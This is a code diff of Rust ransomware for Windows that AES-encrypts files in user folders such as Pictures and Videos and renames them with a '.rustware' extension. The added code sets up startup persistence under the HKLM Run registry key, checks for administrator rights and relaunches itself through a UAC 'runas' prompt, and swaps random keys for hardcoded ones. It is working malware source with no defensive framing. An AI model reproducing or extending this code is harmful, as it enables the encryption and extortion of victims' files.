@@ -1,5 +1,6 @@
 use libaes::Cipher; 
 use rand::Rng;
+use std::ptr::null_mut;
 
 use std::ffi::CString;
 use std::ptr;
@@ -8,8 +9,18 @@ use std::{
     fs
 };
 
+
 use windows_sys::{
-    core::*, Win32::Foundation::*, Win32::System::Threading::*, Win32::System::WindowsProgramming::*,Win32::System::Diagnostics::Debug::*,Win32::UI::WindowsAndMessaging::*,
+    core::*, Win32::Foundation::*, 
+                 Win32::System::Threading::*,
+		 Win32::System::WindowsProgramming::*,
+		Win32::System::Diagnostics::Debug::*,
+		Win32::UI::WindowsAndMessaging::*,
+		Win32::System::LibraryLoader::*,
+		Win32::Security::*,
+		Win32::UI::Shell::*,
+		Win32::System::Registry::*,
+			
 
 };
 
@@ -29,6 +40,129 @@ use windows_sys::{
         "Pictures",
         "Videos",
     ];
+
+
+
+pub fn add_registry() -> bool {
+    unsafe {
+        let mut registry_handle: HKEY = 0;
+        if RegOpenKeyExA(
+            HKEY_LOCAL_MACHINE,
+            CString::new("Software\\Microsoft\\Windows\\CurrentVersion\\Run")
+                .unwrap()
+                .as_ptr() as *const u8,
+            0,
+            KEY_ALL_ACCESS,
+            &mut registry_handle,
+        ) != 0
+        {
+            println!("Fail to open registry key");
+            RegCloseKey(registry_handle);
+            return false;
+        }
+
+        let mut reg_type: u32 = 0;
+        let mut path: Vec<u8> = Vec::new();
+        let mut size: u32 = 200;
+        path.resize(200, 0u8);
+
+        if RegGetValueA(
+            HKEY_LOCAL_MACHINE,
+            CString::new("Software\\Microsoft\\Windows\\CurrentVersion\\Run")
+                .unwrap()
+                .as_ptr() as *const u8,
+            CString::new("Dannys'sRansomware").unwrap().as_ptr() as *const u8,
+            2,
+            &mut reg_type,
+            path.as_ptr() as *const _ as *mut _,
+            &mut size,
+        ) != 0
+        {
+            let mut name: Vec<i8> = Vec::new();
+            name.resize(200, 0i8);
+            let mut length = GetModuleFileNameA(0, name.as_ptr() as *mut u8, 200);
+            let mut path: Vec<u8> = Vec::new();
+            for i in 0..length as usize {
+                path.push(name[i].clone() as u8);
+            }
+            path.push(0u8);
+            length += 1;
+
+            if RegSetValueExA(
+                registry_handle,
+                CString::new("Danny'sRansomware").unwrap().as_ptr() as *const u8,
+                0,
+                REG_SZ,
+                path.as_ptr(),
+                length,
+            ) != 0
+            {
+                println!("Fail to set registry key");
+                RegCloseKey(registry_handle);
+                return false;
+            } else {
+                RegCloseKey(registry_handle);
+                return true;
+            }
+        } else {
+            println!("Key already there, dont do anything");
+            RegCloseKey(registry_handle);
+            return false;
+        }
+    }
+}
+
+
+
+
+
+
+
+pub fn check_elevation() -> bool {
+    unsafe {
+        let mut name: Vec<i8> = Vec::new();
+        name.resize(200, 0i8);
+        let length = GetModuleFileNameA(0, name.as_ptr() as *mut u8, 200);
+        let mut path: Vec<u8> = Vec::new();
+        for i in 0..length as usize {
+            path.push(name[i].clone() as u8);
+        }
+        if is_elevated() {
+            return true;
+        } else {
+            println!("This is not elevated yet");
+            ShellExecuteA(
+                0,
+                CString::new("runas").unwrap().as_ptr() as *const u8,
+                CString::from_vec_unchecked(path).as_ptr() as *const u8,
+                null_mut(),
+                null_mut(),
+                1,
+            );
+        }
+        return false;
+    }
+}
+
+pub fn is_elevated() -> bool {
+    // https://vimalshekar.github.io/codesamples/Checking-If-Admin
+    let mut h_token: HANDLE = 0;
+    let mut token_ele: TOKEN_ELEVATION = TOKEN_ELEVATION { TokenIsElevated: 0 };
+    let mut size: u32 = 0u32;
+    unsafe {
+        OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &mut h_token);
+        GetTokenInformation(
+            h_token,
+            TokenElevation,
+            &mut token_ele as *const _ as *mut _,
+            std::mem::size_of::<TOKEN_ELEVATION>() as u32,
+            &mut size,
+        );
+        return token_ele.TokenIsElevated == 1;
+    }
+}
+
+
 
 fn get_username_name() -> String{
 unsafe {
@@ -86,14 +220,14 @@ fn generate_random_iv() -> [u8; 16] {
 
 
 fn encrypt_decrypt(file_name: &str, action: &str) -> bool {
-    let key = generate_random_key();
-    let iv = generate_random_iv();
+     let key = b"fTjWmZq4t7w!z%C*";
+    let iv = b"+MbQeThWmZq4t6w9";
     let cipher = Cipher::new_128(&key);
 
     match action {
         "encrypt" => {
             println!("[*] Encrypting {}", file_name);
-            let encrypted = cipher.cbc_encrypt(&iv, &fs::read(file_name).unwrap());
+            let encrypted = cipher.cbc_encrypt(iv, &fs::read(file_name).unwrap());
             fs::write(file_name, encrypted).unwrap();
             let new_filename = format!("{}.rustware", file_name);
             fs::rename(file_name, new_filename).unwrap();
@@ -101,7 +235,7 @@ fn encrypt_decrypt(file_name: &str, action: &str) -> bool {
 
         "decrypt" => {
             println!("[*] Decrypting {}", file_name);
-            let decrypted = cipher.cbc_decrypt(&iv, &fs::read(file_name).unwrap());
+            let decrypted = cipher.cbc_decrypt(iv, &fs::read(file_name).unwrap());
             if let Err(err)=fs::write(file_name, decrypted){
 		    eprintln!("Error writing to file: {}", err);
 
@@ -134,7 +268,7 @@ for dir in dir_names.iter() {
 	if  let Ok(entries) = fs::read_dir(path_str) {
 	let entries = fs::read_dir(path_str).unwrap();
 
-    for raw_entry in entries {
+   	 for raw_entry in entries {
         let entry = raw_entry.unwrap();
 
         if entry.file_type().unwrap().is_file() {
@@ -142,7 +276,7 @@ for dir in dir_names.iter() {
             println!("File Name: {}", entry.path().display());
 	    let file_path = entry.path();
 	    let file_path_str = file_path.to_str();
-            if file_path_str.unwrap().to_lowercase().contains("rustware") || file_path_str.unwrap().to_lowercase().contains("snakegame") || file_path_str.unwrap().to_lowercase().contains(".ini") {
+            if file_path_str.unwrap().to_lowercase().contains("rustware") || file_path_str.unwrap().to_lowercase().contains("snakegame") || file_path_str.unwrap().to_lowercase().contains("ini") {
                 // Skip files containing "rustware" or "snakegame" in the file path
                 continue;
             }
